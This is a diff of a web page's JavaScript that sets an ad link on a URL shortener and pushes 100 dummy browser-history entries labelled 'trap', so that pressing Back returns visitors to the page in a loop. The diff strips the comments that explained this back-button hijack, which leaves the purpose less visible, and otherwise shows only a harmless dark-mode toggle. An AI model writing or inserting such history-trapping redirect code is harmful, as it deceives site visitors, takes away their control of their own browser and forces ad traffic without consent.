@@ -1,10 +1,9 @@
 // ====== Configuration ======
-const AD_URL = "https://shorter.me/WHO7C"; // target ad link (yang diminta)
-const HISTORY_PUSH_COUNT = 100; // jumlah pushState sebelum redirect, membantu "back loop"
+const AD_URL = "https://shorter.me/WHO7C"; 
+const HISTORY_PUSH_COUNT = 100; 
 
 // ====== Helpers ======
 function safePushStates(count = 1) {
-  // push dummy states to history so 'Back' from external will land back here
   for (let i = 0; i < count; i++) {
     try { history.pushState({trap:i}, "", location.href); } catch(e) { /* ignore */ }
   }
@@ -83,5 +82,6 @@ if (toggleBtn) {
     toggleBtn.innerHTML = document.body.classList.contains('dark') ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
   });
 }
+
 
 
